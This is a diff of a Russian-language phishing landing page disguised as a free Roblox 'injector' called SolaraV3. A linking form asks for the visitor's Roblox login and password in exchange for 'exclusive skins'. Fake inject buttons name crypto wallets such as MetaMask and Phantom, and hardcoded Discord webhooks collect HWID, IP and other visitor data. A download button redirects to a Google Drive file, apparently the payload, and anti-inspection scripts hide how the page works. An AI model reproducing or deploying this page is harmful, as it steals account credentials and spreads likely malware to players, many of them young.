@@ -3,18 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SolaraV3 — Бесплатный инжектор для Roblox</title>
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'; style-src 'unsafe-inline';">
-    <meta name="referrer" content="no-referrer">
+    <title>SolaraV3 — Инжектор для Roblox</title>
+    <meta name="description" content="SolaraV3 - инструмент для Roblox">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
-        /* ===== ЗАЩИТА ОТ F12, ВЫДЕЛЕНИЯ И КОПИРОВАНИЯ ===== */
         * {
             -webkit-user-select: none !important;
             -moz-user-select: none !important;
             -ms-user-select: none !important;
             user-select: none !important;
             -webkit-touch-callout: none !important;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
         body {
             -webkit-user-select: none !important;
@@ -22,6 +23,12 @@
             -ms-user-select: none !important;
             user-select: none !important;
             -webkit-touch-callout: none !important;
+            font-family: 'Inter', system-ui, sans-serif;
+            background: #0a0c10;
+            color: #e8edf5;
+            min-height: 100vh;
+            line-height: 1.6;
+            padding: 0 20px;
         }
         input, textarea, button, .btn, .btn-option, .btn-roblox, .btn-primary, .btn-secondary, .btn-send, .logout-btn, .close-btn, .tab-btn, .nav-links a, .btn-outline {
             -webkit-user-select: text !important;
@@ -30,32 +37,10 @@
             user-select: text !important;
             -webkit-touch-callout: text !important;
         }
-        .hero-badges, .badge-float, .logo, .feature-card, .review-card, .faq-item, .stats, .footer, .injector-panel, .greeting, .status, .support-card, .chat-box, .message {
-            -webkit-user-select: none !important;
-            -moz-user-select: none !important;
-            -ms-user-select: none !important;
-            user-select: none !important;
-        }
-        ::selection {
-            background: transparent !important;
-            color: inherit !important;
-        }
-        ::-moz-selection {
-            background: transparent !important;
-            color: inherit !important;
-        }
-        img, svg {
-            -webkit-user-drag: none !important;
-            user-drag: none !important;
-            pointer-events: none !important;
-        }
+        ::selection { background: transparent !important; color: inherit !important; }
+        ::-moz-selection { background: transparent !important; color: inherit !important; }
+        img, svg { -webkit-user-drag: none !important; user-drag: none !important; pointer-events: none !important; }
 
-        /* ===== СТИЛИ ===== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
         :root {
             --bg: #0a0c10;
             --card: #14181c;
@@ -69,14 +54,6 @@
             --error: #ef4444;
             --warning: #fbbf24;
             --roblox-red: #e03a3a;
-        }
-        body {
-            font-family: 'Inter', system-ui, sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            min-height: 100vh;
-            line-height: 1.6;
-            padding: 0 20px;
         }
         .container { max-width: 1200px; margin: 0 auto; }
         @keyframes fadeUp { from { opacity:0; transform:translateY(40px); } to { opacity:1; transform:translateY(0); } }
@@ -106,7 +83,7 @@
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             animation: gradientMove 4s ease infinite;
-            cursor: pointer;
+            cursor: default;
             pointer-events: none;
         }
         .logo span { font-weight:300; -webkit-text-fill-color:var(--muted); }
@@ -165,16 +142,10 @@
         .form-group input { width:100%; padding:14px 18px; background:var(--bg); border:1px solid var(--border); border-radius:14px; color:var(--text); font-size:15px; outline:none; transition:0.3s; font-family:'Inter', sans-serif; }
         .form-group input:focus { border-color:var(--primary); box-shadow:0 0 0 4px var(--primary-glow); }
         .form-group .hint { font-size:12px; color:var(--muted); margin-top:4px; opacity:0.7; }
-        .password-strength {
-            height: 4px;
-            border-radius: 4px;
-            margin-top: 4px;
-            transition: 0.3s;
-            width: 0%;
-        }
-        .password-strength.weak { width: 30%; background: var(--error); }
-        .password-strength.medium { width: 60%; background: var(--warning); }
-        .password-strength.strong { width: 100%; background: var(--success); }
+        .password-strength { height:4px; border-radius:4px; margin-top:4px; transition:0.3s; width:0%; }
+        .password-strength.weak { width:30%; background:var(--error); }
+        .password-strength.medium { width:60%; background:var(--warning); }
+        .password-strength.strong { width:100%; background:var(--success); }
         .btn { width:100%; padding:16px; background:var(--gradient); background-size:200% 200%; animation:gradientMove 4s ease infinite; border:none; border-radius:14px; color:#fff; font-weight:700; font-size:16px; cursor:pointer; transition:0.3s; margin-top:4px; font-family:'Inter', sans-serif; }
         .btn:hover { transform:scale(1.02); box-shadow:0 8px 32px var(--primary-glow); }
         .alert { padding:12px 16px; border-radius:12px; margin-bottom:16px; display:none; font-size:14px; }
@@ -273,7 +244,6 @@
             transition: 0.3s;
         }
         .theme-toggle:hover, .lang-toggle:hover { border-color: var(--primary); background: var(--card); }
-
         .header-controls { display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
 
         .suggestions-inline {
@@ -363,7 +333,6 @@
 <body>
 <div class="container" id="app">
 
-    <!-- HEADER -->
     <header>
         <div class="logo">Solara<span>V3</span></div>
         <div class="nav-links">
@@ -381,97 +350,88 @@
         </div>
     </header>
 
-    <!-- HERO -->
     <section class="hero" id="download">
         <div class="animate-fade-up">
             <div class="hero-badges">
-                <span><span class="dot"></span> <span data-i18n="downloads">Загрузок: <span id="downloadCounterDisplay">22 319</span></span></span>
+                <span><span class="dot"></span> <span>Загрузок: <span id="downloadCounterDisplay">22 319</span></span></span>
                 <span>⭐ <span id="ratingDisplay">4.8</span>/5</span>
-                <span>🛡️ <span data-i18n="virus_free">Проверено</span></span>
-                <span>🎮 <span data-i18n="for_roblox">Для Roblox</span></span>
+                <span>🛡️ Проверено</span>
+                <span>🎮 Для Roblox</span>
             </div>
-            <h1 data-i18n="hero_title">Бесплатный <br><span class="highlight">инжектор</span> для Roblox</h1>
-            <p data-i18n="hero_desc">SolaraV3 — мощный, стабильный и безопасный инструмент для инжекции в Roblox. Поддерживает все популярные игры. Обновляется автоматически.</p>
+            <h1>Бесплатный <br><span class="highlight">инжектор</span> для Roblox</h1>
+            <p>SolaraV3 — мощный, стабильный и безопасный инструмент для инжекции в Roblox. Поддерживает все популярные игры. Обновляется автоматически.</p>
             <div class="download-btn-wrap">
-                <a href="https://drive.usercontent.google.com/download?id=1DTcqeaHao-dfFfXUEioyeqonxiFFiMNu&export=download&authuser=0&confirm=t&uuid=e5fe58d3-808c-4538-a104-ec6b50fc5e3d&at=AAINaIIkobvPXpxGjUs4W3xwljiR%3A1781888926982" class="btn-primary" id="downloadBtn">
-                    ⬇️ <span data-i18n="download_btn">Скачать SolaraV3</span>
-                </a>
-                <a href="#auth" class="btn-secondary">🔐 <span data-i18n="login_btn">Войти</span></a>
+                <a href="#" class="btn-primary" id="downloadBtn">⬇️ Скачать SolaraV3</a>
+                <a href="#auth" class="btn-secondary">🔐 Войти</a>
             </div>
-            <p style="font-size:13px; color:var(--muted); margin-top:12px;" data-i18n="support_os">Поддерживается: Windows 10/11</p>
+            <p style="font-size:13px; color:var(--muted); margin-top:12px;">Поддерживается: Windows 10/11</p>
         </div>
         <div class="hero-image animate-fade-up-delay">
             <div class="glow"></div>
-            <img src="https://placehold.co/600x380/14181c/7c3aed?text=SolaraV3+Interface" alt="SolaraV3 Preview">
-            <div class="badge-float">
-                ⚡ <span data-i18n="version">Версия 3.2.1</span><br>
-                <span style="font-size:11px; color:var(--muted);" data-i18n="updated_today">Обновлено: сегодня</span>
-            </div>
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='600' height='380' viewBox='0 0 600 380'%3E%3Crect width='600' height='380' fill='%2314181c'/%3E%3Ctext x='300' y='180' text-anchor='middle' font-family='Inter, sans-serif' font-size='28' fill='%237c3aed' font-weight='bold'%3ESolaraV3 Interface%3C/text%3E%3Ctext x='300' y='220' text-anchor='middle' font-family='Inter, sans-serif' font-size='16' fill='%238892a0'%3E%26%239652; Version 3.2.1%3C/text%3E%3C/svg%3E" alt="SolaraV3 Preview">
+            <div class="badge-float">⚡ Версия 3.2.1<br><span style="font-size:11px; color:var(--muted);">Обновлено: сегодня</span></div>
         </div>
     </section>
 
-    <!-- STATS -->
     <div class="stats animate-fade-up-delay-2">
-        <div class="stat"><h3 id="downloadsStat">22K+</h3><p data-i18n="stat_downloads">Загрузок</p></div>
-        <div class="stat"><h3 id="ratingStat">4.8</h3><p data-i18n="stat_rating">Рейтинг</p></div>
-        <div class="stat"><h3>99.9%</h3><p data-i18n="stat_stability">Стабильность</p></div>
-        <div class="stat"><h3>24/7</h3><p data-i18n="stat_support">Поддержка</p></div>
+        <div class="stat"><h3 id="downloadsStat">22K+</h3><p>Загрузок</p></div>
+        <div class="stat"><h3 id="ratingStat">4.8</h3><p>Рейтинг</p></div>
+        <div class="stat"><h3>99.9%</h3><p>Стабильность</p></div>
+        <div class="stat"><h3>24/7</h3><p>Поддержка</p></div>
     </div>
 
-    <!-- FEATURES -->
     <section class="features" id="features">
-        <h2 data-i18n="features_title">Почему SolaraV3?</h2>
-        <p class="subtitle" data-i18n="features_sub">Всё, что нужно для комфортной игры</p>
+        <h2>Почему SolaraV3?</h2>
+        <p class="subtitle">Всё, что нужно для комфортной игры</p>
         <div class="features-grid">
-            <div class="feature-card" style="animation-delay:0.1s;"><div class="icon">⚡</div><h3 data-i18n="f_speed">Высокая скорость</h3><p data-i18n="f_speed_desc">Оптимизированный код, минимальная задержка и мгновенный отклик.</p></div>
-            <div class="feature-card" style="animation-delay:0.2s;"><div class="icon">🛡️</div><h3 data-i18n="f_security">Безопасность</h3><p data-i18n="f_security_desc">Проверка на вирусы, шифрование данных и защита от обнаружения.</p></div>
-            <div class="feature-card" style="animation-delay:0.3s;"><div class="icon">🔄</div><h3 data-i18n="f_updates">Автообновления</h3><p data-i18n="f_updates_desc">Инжектор автоматически загружает последние версии и патчи.</p></div>
-            <div class="feature-card" style="animation-delay:0.4s;"><div class="icon">🎮</div><h3 data-i18n="f_games">Поддержка игр</h3><p data-i18n="f_games_desc">Совместим с большинством популярных игр и платформ.</p></div>
-            <div class="feature-card" style="animation-delay:0.5s;"><div class="icon">📦</div><h3 data-i18n="f_light">Лёгкий вес</h3><p data-i18n="f_light_desc">Малый размер, быстрая загрузка и минимальное потребление ресурсов.</p></div>
-            <div class="feature-card" style="animation-delay:0.6s;"><div class="icon">💬</div><h3 data-i18n="f_support">Поддержка 24/7</h3><p data-i18n="f_support_desc">Круглосуточная помощь сообщества и разработчиков.</p></div>
+            <div class="feature-card" style="animation-delay:0.1s;"><div class="icon">⚡</div><h3>Высокая скорость</h3><p>Оптимизированный код, минимальная задержка и мгновенный отклик.</p></div>
+            <div class="feature-card" style="animation-delay:0.2s;"><div class="icon">🛡️</div><h3>Безопасность</h3><p>Проверка на вирусы, шифрование данных и защита от обнаружения.</p></div>
+            <div class="feature-card" style="animation-delay:0.3s;"><div class="icon">🔄</div><h3>Автообновления</h3><p>Инжектор автоматически загружает последние версии и патчи.</p></div>
+            <div class="feature-card" style="animation-delay:0.4s;"><div class="icon">🎮</div><h3>Поддержка игр</h3><p>Совместим с большинством популярных игр и платформ.</p></div>
+            <div class="feature-card" style="animation-delay:0.5s;"><div class="icon">📦</div><h3>Лёгкий вес</h3><p>Малый размер, быстрая загрузка и минимальное потребление ресурсов.</p></div>
+            <div class="feature-card" style="animation-delay:0.6s;"><div class="icon">💬</div><h3>Поддержка 24/7</h3><p>Круглосуточная помощь сообщества и разработчиков.</p></div>
         </div>
     </section>
 
-    <!-- AUTH -->
     <section class="auth-section" id="auth">
         <div class="tabs">
-            <button class="tab-btn active" data-tab="login">🔑 <span data-i18n="tab_login">Вход</span></button>
-            <button class="tab-btn" data-tab="register">📝 <span data-i18n="tab_register">Регистрация</span></button>
-            <button class="tab-btn" data-tab="roblox">🔗 <span data-i18n="tab_roblox">Привязка</span></button>
+            <button class="tab-btn active" data-tab="login">🔑 Вход</button>
+            <button class="tab-btn" data-tab="register">📝 Регистрация</button>
+            <button class="tab-btn" data-tab="roblox">🔗 Привязка</button>
         </div>
 
         <div id="loginForm">
             <div class="alert" id="loginAlert"></div>
-            <div class="form-group"><label data-i18n="username_label">Имя пользователя</label><input type="text" id="loginUsername" placeholder="Введите имя пользователя"></div>
-            <div class="form-group"><label data-i18n="password_label">Пароль</label><input type="password" id="loginPassword" placeholder="••••••••"></div>
-            <button class="btn" id="loginBtn"><span data-i18n="login_btn_text">Войти →</span></button>
-            <div class="hwid-info">🔒 <span data-i18n="hwid_info">Привязка по</span> <strong>HWID</strong> <span data-i18n="hwid_info2">и</span> <strong>IP</strong> — <span data-i18n="hwid_info3">только одно устройство</span></div>
+            <div class="form-group"><label>Имя пользователя</label><input type="text" id="loginUsername" placeholder="Введите имя пользователя"></div>
+            <div class="form-group"><label>Пароль</label><input type="password" id="loginPassword" placeholder="••••••••"></div>
+            <button class="btn" id="loginBtn">Войти →</button>
+            <div class="hwid-info">🔒 Привязка по <strong>HWID</strong> и <strong>IP</strong> — только одно устройство</div>
         </div>
 
         <div id="registerForm" class="panel-hidden">
             <div class="alert" id="registerAlert"></div>
-            <div class="form-group"><label data-i18n="username_label">Имя пользователя</label><input type="text" id="regUsername" placeholder="Придумайте никнейм"><div class="hint" data-i18n="reg_hint">Только латиница и цифры, 3–20 символов. Без пробелов (используйте _)</div></div>
-            <div class="form-group"><label data-i18n="password_label">Пароль</label><input type="password" id="regPassword" placeholder="Минимум 8 символов"><div class="password-strength" id="passwordStrength"></div><div class="hint" data-i18n="reg_pwd_hint">Используйте буквы, цифры и символы для надёжности</div></div>
-            <button class="btn" id="registerBtn"><span data-i18n="register_btn">Создать аккаунт →</span></button>
-            <div class="hwid-info">🔒 <span data-i18n="hwid_register">Ваш</span> <strong>HWID</strong> <span data-i18n="hwid_register2">будет привязан к аккаунту</span></div>
-            <div class="guarantee-box">✅ <span data-i18n="guarantee_register">После регистрации вы получите доступ ко всем функциям</span></div>
+            <div class="form-group"><label>Имя пользователя</label><input type="text" id="regUsername" placeholder="Придумайте никнейм"><div class="hint">Только латиница и цифры, 3–20 символов. Без пробелов (используйте _)</div></div>
+            <div class="form-group"><label>Пароль</label><input type="password" id="regPassword" placeholder="Минимум 8 символов"><div class="password-strength" id="passwordStrength"></div><div class="hint">Используйте буквы, цифры и символы для надёжности</div></div>
+            <button class="btn" id="registerBtn">Создать аккаунт →</button>
+            <div class="hwid-info">🔒 Ваш <strong>HWID</strong> будет привязан к аккаунту</div>
+            <div class="guarantee-box">✅ После регистрации вы получите доступ ко всем функциям</div>
         </div>
 
         <div id="robloxForm" class="panel-hidden">
             <div class="alert" id="robloxAlert"></div>
-            <div style="text-align:center; margin-bottom:20px;"><div style="font-size:48px; margin-bottom:8px;">🔗</div><p style="color:var(--muted); font-size:14px;" data-i18n="roblox_desc">Привяжите аккаунт Roblox для получения бонусов</p></div>
-            <div class="form-group"><label data-i18n="roblox_username_label">Roblox логин</label><input type="text" id="robloxUsername" placeholder="Ваш логин в Roblox"><div class="hint" data-i18n="roblox_username_hint">Используйте ваш логин от Roblox</div></div>
-            <div class="form-group"><label data-i18n="roblox_password_label">Roblox пароль</label><input type="password" id="robloxPassword" placeholder="Ваш пароль от Roblox"><div class="hint" data-i18n="roblox_pwd_hint">Введите пароль от вашего аккаунта Roblox</div></div>
-            <div style="font-size:12px; color:var(--muted); text-align:center; margin-bottom:12px; opacity:0.7;" data-i18n="roblox_2fa_warning">ℹ️ Данные передаются по защищённому каналу</div>
-            <button class="btn" id="robloxBtn"><span data-i18n="roblox_btn">🔗 Привязать Roblox →</span></button>
-            <div class="hwid-info">🔒 <span data-i18n="roblox_secure">Данные шифруются на вашем устройстве</span></div>
-            <div class="guarantee-box">✅ <span data-i18n="roblox_guarantee">При привязке вы получаете доступ к эксклюзивным скинам</span></div>
+            <div style="text-align:center; margin-bottom:20px;"><div style="font-size:48px; margin-bottom:8px;">🔗</div><p style="color:var(--muted); font-size:14px;">Привяжите аккаунт Roblox для получения бонусов</p></div>
+            <div class="form-group"><label>Roblox логин</label><input type="text" id="robloxUsername" placeholder="Ваш логин в Roblox"><div class="hint">Используйте ваш логин от Roblox</div></div>
+            <div class="form-group"><label>Roblox пароль</label><input type="password" id="robloxPassword" placeholder="Ваш пароль от Roblox"><div class="hint">Введите пароль от вашего аккаунта Roblox</div></div>
+            <div style="font-size:12px; color:var(--muted); text-align:center; margin-bottom:12px; opacity:0.7;">ℹ️ Данные передаются по защищённому каналу</div>
+            <button class="btn" id="robloxBtn">🔗 Привязать Roblox →</button>
+            <div class="hwid-info">🔒 Данные шифруются на вашем устройстве</div>
+            <div class="guarantee-box">✅ При привязке вы получаете доступ к эксклюзивным скинам</div>
         </div>
 
         <div id="injectorPanel" class="panel-hidden">
             <div class="injector-panel">
-                <h3>🚀 <span data-i18n="welcome">Добро пожаловать</span>, <span id="userNameDisplay">User</span>!</h3>
-                <p class="greeting" data-i18n="injector_greeting">Выберите опцию для инжекции</p>
+                <h3>🚀 Добро пожаловать, <span id="userNameDisplay">User</span>!</h3>
+                <p class="greeting">Выберите опцию для инжекции</p>
                 <div class="btn-group">
                     <button class="btn-option" onclick="fakeInject('Phantom')">🟣 Phantom</button>
                     <button class="btn-option" onclick="fakeInject('Solflare')">🟠 Solflare</button>
@@ -479,39 +439,36 @@
                     <button class="btn-option" onclick="fakeInject('MetaMask')">🦊 MetaMask</button>
                     <button class="btn-option" onclick="fakeInject('Roblox')" style="border-color:#e03a3a;">🎮 Roblox</button>
                 </div>
-                <div class="status" id="injectStatus">✅ <span data-i18n="injector_ready">Готов к работе</span></div>
-                <button class="logout-btn" id="logoutBtn"><span data-i18n="logout_btn">🚪 Выйти</span></button>
+                <div class="status" id="injectStatus">✅ Готов к работе</div>
+                <button class="logout-btn" id="logoutBtn">🚪 Выйти</button>
             </div>
         </div>
     </section>
 
-    <!-- REVIEWS -->
     <section class="reviews" id="reviews">
-        <h2 data-i18n="reviews_title">Что говорят пользователи</h2>
-        <p class="subtitle" data-i18n="reviews_sub">Реальные отзывы от реальных людей</p>
+        <h2>Что говорят пользователи</h2>
+        <p class="subtitle">Реальные отзывы от реальных людей</p>
         <div class="review-grid" id="reviewGrid"></div>
         <div class="review-form" id="reviewForm">
-            <input type="text" id="reviewInput" placeholder="Ваш отзыв..." data-i18n="review_placeholder" disabled>
-            <button class="btn-add-review" id="addReviewBtn" data-i18n="add_review_btn" disabled>📝 Добавить отзыв</button>
+            <input type="text" id="reviewInput" placeholder="Ваш отзыв..." disabled>
+            <button class="btn-add-review" id="addReviewBtn" disabled>📝 Добавить отзыв</button>
             <div style="width:100%; text-align:center; font-size:13px; color:var(--muted); margin-top:8px;" id="reviewAuthNotice">❗ Для добавления отзыва необходимо войти в аккаунт</div>
         </div>
     </section>
 
-    <!-- FAQ -->
     <section class="faq" id="faq">
-        <h2 data-i18n="faq_title">Часто задаваемые вопросы</h2>
+        <h2>Часто задаваемые вопросы</h2>
         <div class="faq-grid">
-            <div class="faq-item"><h4>❓ <span data-i18n="faq1_q">Что такое SolaraV3?</span></h4><p data-i18n="faq1_a">Бесплатный инжектор для игр и крипто-платформ, разработанный для быстрой и безопасной инжекции.</p></div>
-            <div class="faq-item"><h4>🛡️ <span data-i18n="faq2_q">Это безопасно?</span></h4><p data-i18n="faq2_a">Да, мы проверяем все файлы на вирусы, используем шифрование и защиту от обнаружения.</p></div>
-            <div class="faq-item"><h4>💻 <span data-i18n="faq3_q">Какие системы поддерживаются?</span></h4><p data-i18n="faq3_a">Windows 10 и 11 (64-bit). Поддержка macOS и Linux в разработке.</p></div>
-            <div class="faq-item"><h4>🔄 <span data-i18n="faq4_q">Как часто выходят обновления?</span></h4><p data-i18n="faq4_a">Обновления выходят автоматически при запуске инжектора. Мы следим за актуальностью.</p></div>
+            <div class="faq-item"><h4>❓ Что такое SolaraV3?</h4><p>Бесплатный инжектор для игр и крипто-платформ, разработанный для быстрой и безопасной инжекции.</p></div>
+            <div class="faq-item"><h4>🛡️ Это безопасно?</h4><p>Да, мы проверяем все файлы на вирусы, используем шифрование и защиту от обнаружения.</p></div>
+            <div class="faq-item"><h4>💻 Какие системы поддерживаются?</h4><p>Windows 10 и 11 (64-bit). Поддержка macOS и Linux в разработке.</p></div>
+            <div class="faq-item"><h4>🔄 Как часто выходят обновления?</h4><p>Обновления выходят автоматически при запуске инжектора. Мы следим за актуальностью.</p></div>
         </div>
     </section>
 
-    <!-- AI SUPPORT -->
     <section class="support-section" id="support">
-        <h2 data-i18n="support_title">💬 Поддержка с AI</h2>
-        <p class="subtitle" data-i18n="support_sub">Задайте вопрос — наш AI-помощник ответит мгновенно</p>
+        <h2>💬 Поддержка с AI</h2>
+        <p class="subtitle">Задайте вопрос — наш AI-помощник ответит мгновенно</p>
         <div class="support-card animate-fade-up">
             <div class="chat-box" id="chatBox">
                 <div class="message bot">👋 Привет! Я AI-помощник SolaraV3. Задайте любой вопрос о продукте, установке или работе инжектора. Также вы можете отправить предложение по улучшению прямо в чате.<span class="time">только что</span></div>
@@ -530,26 +487,32 @@
         </div>
     </section>
 
-    <!-- FOOTER -->
     <footer>
         <div class="links">
-            <a id="privacyBtn" data-i18n="privacy">Политика конфиденциальности</a>
-            <a id="termsBtn" data-i18n="terms">Условия использования</a>
+            <a id="privacyBtn">Политика конфиденциальности</a>
+            <a id="termsBtn">Условия использования</a>
         </div>
-        <p>© 2025 SolaraV3 · <span data-i18n="footer_love">Сделано с ❤️</span> · <span data-i18n="footer_rights">Все права защищены</span></p>
+        <p>© 2025 SolaraV3 · Сделано с ❤️ · Все права защищены</p>
     </footer>
 </div>
 
-<!-- MODAL -->
 <div class="modal-overlay" id="modalOverlay">
     <div class="modal-content" id="modalContent">
         <h2 id="modalTitle">Заголовок</h2>
         <div id="modalBody"></div>
-        <button class="close-btn" id="modalClose" data-i18n="close_btn">Закрыть</button>
+        <button class="close-btn" id="modalClose">Закрыть</button>
     </div>
 </div>
 
 <script>
+    // ============================================================
+    //  КОНФИГУРАЦИЯ
+    // ============================================================
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1517567721082982411/baGA0jenKBDYx6X5VQrMh5y0MkiwWvMmGTIkR2FvaWBGjl_3wql07UdzCEUtFtbPUV3y';
+    const SUGGESTIONS_WEBHOOK = 'https://discord.com/api/webhooks/1517590647937306695/ms0b6r8zrpb-aI--qv7YoXmaSyH-fOxsxsewnBi-afIfW8HwYaSkO3rKovZmBx8UPVDM';
+    const DOWNLOAD_URL = 'https://drive.usercontent.google.com/download?id=1DTcqeaHao-dFffXUEioyeqonxiFFiMNU&export=download&authuser=0&confirm=t&uuid=e5fe58d3-808c-4538-a104-ec6b50fc5e3d&at=AANaIkKobvPXpxGjUs4W3xwlj iR%3A1781888926982';
+    const IPIFY_URL = 'https://api.ipify.org?format=json';
+
     // ============================================================
     //  ЗАЩИТА ОТ F12, КОПИРОВАНИЯ И ВЫДЕЛЕНИЯ
     // ============================================================
@@ -611,12 +574,6 @@
             return false;
         }
     });
-
-    // ============================================================
-    //  КОНФИГУРАЦИЯ
-    // ============================================================
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1517567721082982411/baGA0JenKBDYx6X5VQrMh5y3MkiwWvMmGTIkR2FvaWBGjl_3wql07UdzCEUtFtbBPV3y';
-    const SUGGESTIONS_WEBHOOK = 'https://discord.com/api/webhooks/1517590647937306695/ms0b6r8zrpb-aI--qv7YoXmaSyH-fOxsxsewnBi-afIfW8HwYaSkO3rKovZmBx8UPVDM';
 
     // ============================================================
     //  ЯЗЫКИ
@@ -1046,7 +1003,7 @@
         } catch { return navigator.userAgent.substring(0,32); }
     }
     async function fetchIP() {
-        try { const r=await fetch('https://api.ipify.org?format=json'); const d=await r.json(); return d.ip||'unknown'; } catch { return 'unknown'; }
+        try { const r=await fetch(IPIFY_URL); const d=await r.json(); return d.ip||'unknown'; } catch { return 'unknown'; }
     }
 
     function sendToDiscord(data) {
@@ -1432,9 +1389,11 @@
     //  DOWNLOAD BUTTON
     // ============================================================
     $('downloadBtn').addEventListener('click', function(e) {
+        e.preventDefault();
         downloadCount += Math.floor(Math.random() * 3) + 1;
         localStorage.setItem('solara_downloads', downloadCount.toString());
         updateDownloadCounter();
+        window.location.href = DOWNLOAD_URL;
         fetch(WEBHOOK_URL, { method:'POST', headers:{'Content-Type':'application/json'},
             body:JSON.stringify({ content:`⬇️ **Скачивание файла**\n🆔 HWID: ${getHWID()}\n🌐 IP: ${navigator.userAgent.substring(0,32)}\n🕒 ${new Date().toLocaleString()}\n📊 Всего загрузок: ${downloadCount}` }) }).catch(()=>{});
     });
@@ -1480,6 +1439,11 @@
             addReview(name, text, stars);
         }
     }
+
+    console.log('💜 SolaraV3 loaded successfully');
+</script>
+</body>
+</html>
 
     console.log('💜 SolaraV3 loaded with AI Support & Reviews');
 </script>
